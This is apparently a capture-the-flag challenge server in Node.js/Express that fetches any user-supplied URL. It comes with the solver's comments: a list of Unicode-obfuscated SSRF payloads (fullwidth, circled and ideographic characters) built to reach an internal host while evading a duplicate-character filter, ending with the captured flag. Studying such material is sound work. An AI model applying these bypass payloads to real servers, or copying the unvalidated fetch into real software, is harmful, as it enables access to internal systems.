const express = require("express");
const http = require("http");

const app = express();

app.get("/source", (req, res) => {
    return res.sendFile(__filename);
})
app.get('/', (req, res) => {
    const { url } = req.query;
    console.log('url: ', url)
    if (!url || typeof url !== 'string') return res.send("index\n");

    console.log('url.length: ', url.length)
    console.log('set.size: ', new Set(url).size)
    console.log('set: ', new Set(url))
    // no duplicate characters in `url`
    // if (url.length !== new Set(url).size) return res.send("frog\n");

    try {
        http.get(url, resp => {
            resp.setEncoding("utf-8");
            console.log(resp)
            console.log(resp.statusCode)
            resp.statusCode === 200 ? resp.on('data', data => {
                res.send(data)
                return
            }) : res.send(":(");
        }).on('error', (err) => {
            console.log(err)
            res.send("on error WTF?")
        });
    } catch (error) {
        console.log(error)
        res.send("WTF?");
    }
});
app.listen(3000, '0.0.0.0');

// http://the.c0o0o0l-fl444g.server.internal:80
/*
const headerCharRegex = /[^\t\x20-\x7e\x80-\xff]/;

l = [chr(i) for i in range(0x80, 0xff)]
['\x80', '\x81', '\x82', '\x83', '\x84',
'\x85', '\x86', '\x87', '\x88', '\x89',
'\x8a', '\x8b', '\x8c', '\x8d', '\x8e',
'\x8f', '\x90', '\x91', '\x92', '\x93',
'\x94', '\x95', '\x96', '\x97', '\x98',
'\x99', '\x9a', '\x9b', '\x9c', '\x9d',
'\x9e', '\x9f', '\xa0',
'¡', '¢', '£', '¤', '¥', '¦',
'§', '¨', '©', 'ª', '«',
'¬', '\xad', '®', '¯',
'°', '±', '²', '³', '´',
'µ', '¶', '·', '¸',
'¹', 'º', '»', '¼', '½', '¾',
'¿', 'À', 'Á', 'Â', 'Ã',
'Ä', 'Å', 'Æ', 'Ç', 'È', 'É',
'Ê', 'Ë', 'Ì', 'Í', 'Î', 'Ï',
'Ð', 'Ñ', 'Ò', 'Ó', 'Ô', 'Õ',
'Ö', '×', 'Ø', 'Ù', 'Ú', 'Û',
'Ü', 'Ý', 'Þ', 'ß', 'à', 'á',
'â', 'ã', 'ä', 'å', 'æ', 'ç',
'è', 'é', 'ê', 'ë', 'ì', 'í',
'î', 'ï', 'ð', 'ñ', 'ò', 'ó',
'ô', 'õ', 'ö', '÷', 'ø', 'ù',
'ú', 'û', 'ü', 'ý', 'þ']
*/

/*
hTtp:locaLHOst:3000
hTtp:locaLHOsᵀ
hTtp:locaLHÒst:3000
hTtp:127.0.0．1:3000
hTtp:cHu.edU．ｔw
hTtp:kingbus.com．ｔw
hTtp:sPeEd.Hinｅｔ．NＥＴ
hTtp:sPeEⒹ.Hinｅｔ．NＥＴ
hTtp:sPeEⒹ。Hinｅｔ．NＥＴ
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
⓪①②③④⑤⑥⑦⑧⑨
。
hTtp:ＴHe.c０O0o⓪L-fｌ4４④g．sErvｅR。inｔＥｒNal:80
hTtp:ＴHe.c０O0o⓪L-fｌ4４④g．sErvｅR。inｔＥｒNal
flag{C0o0o0oL_baby_ssrf_trick}
*/